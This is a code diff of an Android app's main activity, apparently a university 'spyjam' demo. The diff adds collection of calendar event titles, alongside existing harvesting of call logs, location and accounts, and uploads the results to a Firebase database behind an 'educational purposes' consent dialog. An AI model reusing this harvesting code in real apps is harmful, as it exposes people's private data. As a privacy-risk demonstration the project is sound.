@@ -4,13 +4,12 @@ import android.Manifest
 import android.accounts.AccountManager
 import android.annotation.SuppressLint
 import android.app.AlertDialog
-import android.app.Application
 import android.content.pm.PackageManager
 import android.location.Location
-import android.location.LocationManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.provider.CalendarContract
 import android.provider.CallLog
 import android.provider.ContactsContract
 import android.util.Log
@@ -23,7 +22,6 @@ import com.google.android.gms.location.LocationServices
 import com.google.firebase.database.FirebaseDatabase
 import com.google.firebase.storage.FirebaseStorage
 import kotlinx.android.synthetic.main.activity_main.*
-import ut.ee.cs.spyjam.R
 import java.io.File
 import java.util.*
 import kotlin.collections.ArrayList
@@ -49,7 +47,7 @@ class MainActivity : AppCompatActivity() {
         //alert dialog
         val builder = AlertDialog.Builder(this)
         builder.setTitle("Info")
-        builder.setMessage("This application is only for educational purposes. It can read personal data such as contacts,SMS,pictures and location coordinates.All permissions have to be granted to use application!")
+        builder.setMessage("This application is only for educational purposes. It can read personal data such as contacts,SMS,calendar events,location coordinates etc. All permissions have to be granted to use the application!")
         builder.setPositiveButton("Agree"){ dialog, which ->
             Toast.makeText(applicationContext, "Press buttons to collect data!", Toast.LENGTH_SHORT).show()
         }
@@ -86,10 +84,13 @@ class MainActivity : AppCompatActivity() {
             account.isClickable=false
             account.alpha=0.5f
         }
-        picture.setOnClickListener {
-            getLastPicture()
-            picture.isClickable = false
-            picture.alpha = 0.5f
+        events.setOnClickListener {
+            getCalendarEvents()
+            events.isClickable = false
+            events.alpha = 0.5f
+            val text = "Uloaded!"
+            val duration = Toast.LENGTH_SHORT
+            val toast = Toast.makeText(applicationContext, text, duration).show()
         }
         logs.setOnClickListener {
             logs.isClickable = false
@@ -110,22 +111,27 @@ class MainActivity : AppCompatActivity() {
             ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)!=PackageManager.PERMISSION_GRANTED ||
             ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)!=PackageManager.PERMISSION_GRANTED ||
             ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)!=PackageManager.PERMISSION_GRANTED ||
-            ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)!=PackageManager.PERMISSION_GRANTED
+            ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)!=PackageManager.PERMISSION_GRANTED ||
+            ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALENDAR)!=PackageManager.PERMISSION_GRANTED
         )
         {
-            ActivityCompat.requestPermissions(this, arrayOf(
-                Manifest.permission.READ_SMS,
-                Manifest.permission.READ_CONTACTS,
-                Manifest.permission.GET_ACCOUNTS,
-                Manifest.permission.READ_PHONE_NUMBERS,
-                Manifest.permission.READ_PHONE_STATE,
-                Manifest.permission.READ_CALL_LOG,
-                Manifest.permission.ACCESS_FINE_LOCATION,
-                Manifest.permission.ACCESS_COARSE_LOCATION
-            ),REQ_CODE)
+            ActivityCompat.requestPermissions(
+                this, arrayOf(
+                    Manifest.permission.READ_SMS,
+                    Manifest.permission.READ_CONTACTS,
+                    Manifest.permission.GET_ACCOUNTS,
+                    Manifest.permission.READ_PHONE_NUMBERS,
+                    Manifest.permission.READ_PHONE_STATE,
+                    Manifest.permission.READ_CALL_LOG,
+                    Manifest.permission.ACCESS_FINE_LOCATION,
+                    Manifest.permission.ACCESS_COARSE_LOCATION,
+                    Manifest.permission.READ_CALENDAR,
+
+                    ), REQ_CODE
+            )
         }
         else{
-            Log.d("log","worked")
+            Log.d("log", "worked")
         }
         //permissions
     }
@@ -146,7 +152,7 @@ class MainActivity : AppCompatActivity() {
         grantResults: IntArray
     )   {
         if (requestCode==REQ_CODE){
-            Log.d("log","girdi")
+            Log.d("log", "girdi")
         }
     }
     @RequiresApi(Build.VERSION_CODES.O)
@@ -214,7 +220,7 @@ class MainActivity : AppCompatActivity() {
         var myLatitude = 0.0
         var myLongitude = 0.0
         fusedLocationClient.lastLocation
-            .addOnSuccessListener { location : Location? ->
+            .addOnSuccessListener { location: Location? ->
                 myLatitude = location!!.latitude
                 myLongitude = location.longitude
                 myRef.child("locationCoordinates").setValue("$myLatitude , $myLongitude")
@@ -261,16 +267,39 @@ class MainActivity : AppCompatActivity() {
     @RequiresApi(Build.VERSION_CODES.O)
     @SuppressLint("MissingPermission")
     fun getLogs(){
-        var callMap = HashMap<String,String>()
-        val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI,null,null,null)
+        var callMap = HashMap<String, String>()
+        val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null)
         while (cursor!!.moveToNext()){
            var numberIndex = cursor!!.getColumnIndex(CallLog.Calls.NUMBER)
            var durationIndex = cursor!!.getColumnIndex(CallLog.Calls.DURATION)
            var number = cursor.getString(numberIndex)
            var callDuration = cursor.getString(durationIndex)
-           callMap.put(number,callDuration)
+           callMap.put(number, callDuration)
         }
         cursor.close()
         myRef.child("CallDuration").updateChildren(callMap as Map<String, Any>)
     }
+
+     @SuppressLint("MissingPermission", "NewApi", "SimpleDateFormat")
+     fun getCalendarEvents(){
+          var eventArr = ArrayList<String>()
+         var uri = CalendarContract.Events.CONTENT_URI;
+         val selection = CalendarContract.Events.EVENT_LOCATION + " = ? "
+         val myProjection = arrayOf(
+             "_id",
+             CalendarContract.Events.TITLE,
+             CalendarContract.Events.DTSTART
+         )
+         val cursor = contentResolver.query(uri, myProjection, null, null)
+         var eventSteps = 0
+         while (cursor!!.moveToNext() && eventSteps!=10) {
+             var title = cursor.getString(cursor.getColumnIndex(CalendarContract.Events.TITLE))
+             eventArr.add(title)
+             eventSteps++
+         }
+         cursor.close()
+         myRef.child("calendarEvents").setValue(eventArr)
+
+     }
 }
+
